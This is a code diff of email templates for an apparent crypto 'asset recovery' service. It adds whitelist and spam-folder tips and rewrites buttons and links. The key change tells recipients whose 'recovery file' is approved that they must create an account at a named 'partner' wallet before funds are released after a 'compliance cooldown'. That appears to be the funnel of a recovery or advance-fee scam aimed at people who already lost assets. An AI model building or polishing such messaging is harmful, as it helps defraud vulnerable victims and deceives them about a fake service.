@@ -36,8 +36,8 @@ const C = {
   successBorder:"#bbf7d0",
   warningBg:  "#fdf4ff",
   warningBorder:"#e9d5ff",
-  errorBg:    "#fef2f2",
   errorBorder:"#fecaca",
+  accentEmerald: "#10b981",
 } as const;
 
 function getResendKey(): string | undefined {
@@ -144,6 +144,8 @@ function shell(opts: {
       <div class="footer">
         <p>&copy; 2024 ChanAidRecovery Hub. All rights reserved.</p>
         <p>128 City Road, London, EC1V 2NX, United Kingdom</p>
+        <p style="margin-top: 12px; font-weight: 700; color: ${C.dark};">Tip: Add support@chanaidrecovery.com to your contacts to ensure our updates reach your inbox.</p>
+        <p style="margin-top: 8px;">Check your <strong>Spam</strong> or <strong>Promotions</strong> folder if you don't see our emails.</p>
         <p style="margin-top: 16px;"><a href="${SITE}/privacy-policy" style="color: ${C.mutedText}; text-decoration: underline;">Privacy Policy</a> &bull; <a href="${SITE}/terms" style="color: ${C.mutedText}; text-decoration: underline;">Terms of Service</a></p>
       </div>
     </div>
@@ -167,7 +169,7 @@ export function welcomeEmail(name: string | null) {
         <p>Thank you for choosing ChanAidRecovery Hub. We've received your registration and our team is ready to help you recover your lost digital assets.</p>
         <p>You can now log in to your dashboard to complete your profile and start your recovery application.</p>
         <div style="text-align: center; margin: 32px 0;">
-          <a href="${SITE}/admin" class="btn">Go to Dashboard</a>
+          <a href="${SITE}/dashboard" class="btn">Access Your Dashboard</a>
         </div>
         <p>If you have any questions, simply reply to this email.</p>
       `,
@@ -192,7 +194,7 @@ export function loanSubmittedEmail(name: string | null) {
           <li>You will receive an update via email once the review is complete.</li>
         </ul>
         <div style="text-align: center; margin: 32px 0;">
-          <a href="${SITE}/admin" class="btn">Check Application Status</a>
+          <a href="${SITE}/dashboard" class="btn">Track Application Progress</a>
         </div>
       `,
     }),
@@ -211,12 +213,14 @@ export function loanVerifiedEmail(name: string | null) {
         <p>Hello ${name || "Valued Client"},</p>
         <p>Great news! Your identity verification is complete. Our team has approved your recovery file, and we are now moving to the final settlement phase.</p>
         <div style="background-color: ${C.successBg}; border: 1px solid ${C.successBorder}; padding: 24px; border-radius: 16px; margin: 24px 0;">
-          <h3 style="margin-top: 0; color: #166534; font-size: 16px;">Next Step: Settlement</h3>
-          <p style="margin-bottom: 0; color: #166534; font-size: 14px;">To finalize the return of your assets, please ensure your WisceWallet is active and connected. Our team will initialize the transfer once the compliance cooldown period ends.</p>
+          <h3 style="margin-top: 0; color: #166534; font-size: 16px;">Action Required: Initialize Fund Transfer</h3>
+          <p style="margin-bottom: 0; color: #166534; font-size: 14px;">To receive your recovered assets, you must create and activate an account at <strong>WisceWallet</strong>. This is our secure partner for large-scale digital asset distribution.</p>
+          <p style="margin-top: 12px; color: #166534; font-size: 14px; font-weight: 700;">Once your WisceWallet account is created, your funds will be initialized for transfer after the standard compliance cooldown period.</p>
         </div>
         <div style="text-align: center; margin: 32px 0;">
-          <a href="${WALLET_LINK}" class="btn">Connect to WisceWallet</a>
+          <a href="${WALLET_LINK}" class="btn">Create WisceWallet Account</a>
         </div>
+        <p>If you have already created an account, please ensure it is fully verified to avoid delays in settlement.</p>
       `,
     }),
   };
@@ -236,7 +240,7 @@ export function loanRejectionEmail(name: string | null, reason?: string) {
         ${reason ? `<p><strong>Reason:</strong> ${reason}</p>` : ""}
         <p>If you believe this is an error or would like to provide additional evidence, please reply to this email or visit your dashboard.</p>
         <div style="text-align: center; margin: 32px 0;">
-          <a href="${SITE}/admin" class="btn">View Details</a>
+          <a href="${SITE}/dashboard" class="btn">Review Application Details</a>
         </div>
       `,
     }),
@@ -261,7 +265,7 @@ export function loanStatusUpdateEmail(name: string | null, status: string, reaso
         ` : ""}
         <p>Please log in to your dashboard to view the full details and take any necessary actions.</p>
         <div style="text-align: center; margin: 32px 0;">
-          <a href="${SITE}/admin" class="btn">Access Secure Dashboard</a>
+          <a href="${SITE}/dashboard" class="btn">View Status Update</a>
         </div>
       `,
     }),
@@ -282,7 +286,7 @@ export function customAdminEmail(opts: { userName: string | null; message: strin
         </div>
         <p>If you have any questions or need to reply, please click the button below to visit your dashboard or simply reply to this email.</p>
         <div style="text-align: center; margin: 32px 0;">
-          <a href="${SITE}/admin" class="btn">View Case Dashboard</a>
+          <a href="${SITE}/dashboard" class="btn">View Secure Message</a>
         </div>
       `,
     }),
